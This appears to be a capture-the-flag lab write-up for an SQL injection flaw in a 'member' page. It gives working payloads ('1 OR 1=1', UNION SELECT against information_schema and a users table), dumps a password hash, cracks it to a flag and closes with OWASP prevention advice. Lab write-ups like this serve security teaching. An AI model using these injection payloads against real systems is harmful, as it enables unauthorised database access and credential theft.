# Vulnerability

SQL injection allow you to access and manipulate all your datas.

# Identification

During the request, we have got database error.

# Resolve

Go to http://10.11.249.210/?page=member\
Fill the form with http://10.11.249.210/?page=member\
1 OR 1=1 and submit (http://10.11.249.210/?page=member&id=1+OR+1%3D1&Submit=Submit#)\
It will show all users and we are sure about the vulnerability

Now, we will get all columns and tables from DB\
1 UNION SELECT table_name, column_name FROM information_schema.columns

Table name:

- users

Columns name:

- user_id
- first_name
- last_name
- town
- country
- planet
- Commentaire
- countersign

With this cmd, we will identify the id wanted
1 UNION SELECT 1, user_id FROM users

We will parse all columns and find what we need

5 UNION SELECT concat(user_id, first_name, last_name, town, country, planet), concat(Commentaire, countersign) user_id FROM users where user_id = 5

Commentaire: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
countersign: 5ff9d0165b4f92b14994e5c685cdce28

countersign->md5->lower->sha256->flag

# Prevent

- Use of Prepared Statements (with Parameterized Queries)
- Use of Properly Constructed Stored Procedures
- Allow-list Input Validation
- STRONGLY DISCOURAGED: Escaping All User Supplied Input

# Resources

https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html\
https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection\
https://www.dcode.fr/md5-hash\
https://www.dcode.fr/sha256-hash
